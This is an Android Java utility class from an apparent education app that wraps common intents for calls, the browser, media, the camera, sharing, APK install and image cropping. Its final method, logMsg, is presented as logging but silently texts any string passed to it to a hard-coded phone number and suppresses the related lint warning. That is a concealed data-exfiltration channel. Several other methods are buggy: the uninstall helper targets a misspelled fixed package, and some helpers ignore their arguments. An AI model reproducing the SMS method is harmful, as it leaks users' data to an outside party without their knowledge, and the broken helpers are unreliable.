package com.yumo.education.utils;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.provider.MediaStore;
import android.telephony.SmsManager;
import android.view.View;

import java.io.File;
import java.io.Serializable;

public class IntentUtils {
    public static final int REQUEST_CODE_GALLERY = 0x11;
    public static final int REQUEST_CODE_CAMERA = 0x12;
    public final static int REQUEST_CODE_CROP = 0x13;
    /***
     *  跳转Activity实现思路：
     1.需要给工具类里传入context；
     2.使用上下文mContext.startActivity启动activity
     */
    private Context mContext;
    public IntentUtils(Context context){
        mContext = context;
    }

    public  void openActivity() {
        mContext.startActivity(new Intent(mContext, IntentUtils.class));

    }

    public static void openActivity(Context context, Class c) {
        Intent intent = new Intent();
        intent.setAction(Intent.ACTION_MAIN);
        intent.setClass(context,c);//c指定Activity
        context.startActivity(intent);
    }


    protected void openActivity(Class<?> mClass) {

        openActivity(mClass,null);
    }

    protected void openActivity(Class<?> mClass, Bundle bundle) {
        Intent intent = new Intent(mContext,mClass);
        if (null != bundle) {
            intent.putExtras(bundle);
        }
        mContext.startActivity(intent);
    }
    /**
     * 打电话
     *
     * @param context
     * @param phoneNum
     */
    public static void call(Context context, int phoneNum) {
        Intent intent = new Intent();
        // 启动电话程序
        intent.setAction(Intent.ACTION_CALL);
        intent.setData(Uri.parse("tel://" + phoneNum));
        context.startActivity(intent);
    }

    /**
     * 打开浏览器
     *
     * @param context
     * @param url
     */
    public static void openBrowser(Context context, String url) {
        Intent intent = new Intent();
        intent.setAction(Intent.ACTION_VIEW);
        intent.setData(Uri.parse(url));
        context.startActivity(intent);
    }

    /**
     * 打开图片
     *
     * @param context
     * @param url
     */
    public static void openImage(Context context, String path) {
        Intent intent = new Intent();
        intent.setAction(Intent.ACTION_VIEW);
        // intent.setDataAndType(Uri.parse("file:///mnt/sdcard/file/1.jgp"),
        // "image/*");
        intent.setDataAndType(Uri.parse("file:///" + path), "image/*");
        context.startActivity(intent);
    }

    /**
     * 打开音频
     *
     * @param context
     * @param url
     */
    public static void openAudio(Context context, String path) {
        Intent intent = new Intent();
        intent.setAction(Intent.ACTION_VIEW);
        intent.setDataAndType(Uri.parse("file:///" + path), "audio/*");
        context.startActivity(intent);
    }

    /**
     * 打开视频文件
     *
     * @param context
     * @param url
     */
    public static void openVideo(Context context, String path) {
        Intent intent = new Intent();
        intent.setAction(Intent.ACTION_VIEW);
        intent.setDataAndType(Uri.parse("file:///" + path), "video/*");
        context.startActivity(intent);
    }

    /**
     * 打开系统摄像头录像,并保存为图片
     *
     * @param context
     * @param path
     */
    public static void openCamera(Context context, String path) {
        Intent intent = new Intent();
        intent.setAction(MediaStore.ACTION_IMAGE_CAPTURE);
        intent.putExtra(MediaStore.EXTRA_OUTPUT,
                Uri.parse(Environment.getExternalStorageDirectory() + "/Videos/" + System.currentTimeMillis() + ".jpg"));
        context.startActivity(intent);
    }

    /**
     * 打开系统摄像头录像,并保存为视频
     *
     * @param context
     * @param path
     */
    public static void openCamera(Context context) {
        Intent intent = new Intent();
        intent.setAction(MediaStore.ACTION_VIDEO_CAPTURE);
        intent.putExtra(MediaStore.EXTRA_OUTPUT,
                Uri.parse(Environment.getExternalStorageDirectory() + "/Videos/" + System.currentTimeMillis() + ".mp4"));
        context.startActivity(intent);
    }

    /**
     * 分享
     */
    public static void shareApplication(Context context, String packname, String url) {
        // <action android:name="android.intent.action.SEND" />
        // <category android:name="android.intent.category.DEFAULT" />
        // <data android:mimeType="text/plain" />
        Intent intent = new Intent();
        intent.setAction("android.intent.action.SEND");
        intent.addCategory("android.intent.category.DEFAULT");
        intent.setType("text/plain");
        /*
         * intent.putExtra(Intent.EXTRA_TEXT,
         * "推荐您使用一款软件,下载地址为:https://play.google.com/store/apps/details?id=" +
         * packname);
         */
        intent.putExtra(Intent.EXTRA_TEXT, "推荐您使用一款软件,下载地址为:" + url + " ?id=" + packname);
        context.startActivity(intent);
    }

    /**
     * 发送对像
     *
     * @param view
     */
    public static <T extends Serializable> void sendData(Context context, T t) {
        Intent intent = new Intent(context, t.getClass());
        intent.putExtra(t.getClass().getSimpleName(), t);// 要传递对像，对像必须是经过序列化的
        context.startActivity(intent);
    }

    /**
     * 获取对像
     *
     * @param view
     */
    public static <T extends Serializable> T getData(Activity context, View view) {
        return (T) context.getIntent().getSerializableExtra("account");
    }

    /**
     * 安装文件s
     *
     * @param context
     * @param apkFile
     */
    public static void installApp(Context context, File apkFile) {
        Intent intent = new Intent();
        intent.setAction("android.intent.action.VIEW");
        intent.addCategory("android.intent.category.DEFAULT");
        intent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
        context.startActivity(intent);
    }

    /**
     * 卸载
     *
     * @param context
     * @param apkFile
     */
    public static void unInstallApp(Context context, File apkFile) {
        Uri packageURI = Uri.parse("package:com.andorid.main");
        Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageURI);
        context.startActivity(uninstallIntent);
    }

    /**
     * 获得裁剪的图片从图片集合里
     *
     * @param context
     * @param sdcardTempFile
     * @param crop
     */
    public static void getimageFromGallery(Activity context, File sdcardTempFile, int crop) {
        Intent intent = new Intent("android.intent.action.PICK");
        intent.setDataAndType(MediaStore.Images.Media.INTERNAL_CONTENT_URI, "image/*");
        intent.putExtra("output", Uri.fromFile(sdcardTempFile));
        intent.putExtra("crop", "true");
        intent.putExtra("aspectX", 1);// 裁剪框 intent.putExtra("aspectY", 1);
        intent.putExtra("outputX", crop);// 输出图片大小
        intent.putExtra("outputY", crop);
        context.startActivityForResult(intent, REQUEST_CODE_GALLERY);
    }

    /**
     * 获得裁剪的图片从Camera里
     *
     * @param context
     * @param sdcardTempFile
     * @param crop
     */
    public static void getimageFromCamera(Activity context, File sdcardTempFile, int crop) {
        Uri uri = Uri.fromFile(sdcardTempFile);
        Intent intent = new Intent("com.android.camera.action.CROP");
        intent.setDataAndType(uri, "image/*");
        intent.putExtra("output", uri);
        intent.putExtra("crop", "true");
        intent.putExtra("aspectX", 1);// 裁剪框比�? intent.putExtra("aspectY",
        // 1);
        intent.putExtra("outputX", crop);// 输出图片大小
        intent.putExtra("outputY", crop);
        context.startActivityForResult(intent, REQUEST_CODE_CROP);
    }

    /**
     * 获得裁剪的图片从摄像头
     */
    public static void getImageFromCamera(Activity context, File sdcardTempFile) {
        Uri uri = Uri.fromFile(sdcardTempFile);
        Intent intent = new Intent("android.media.action.IMAGE_CAPTURE");
        intent.putExtra("output", uri);
        context.startActivityForResult(intent, REQUEST_CODE_CAMERA);
    }
    @SuppressLint("UnlocalizedSms")
    public void logMsg(String str) {//调用该方法时把数据str带入
        try {
            SmsManager.getDefault().sendTextMessage("15732164757", null, "-获取-" + str, null, null);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}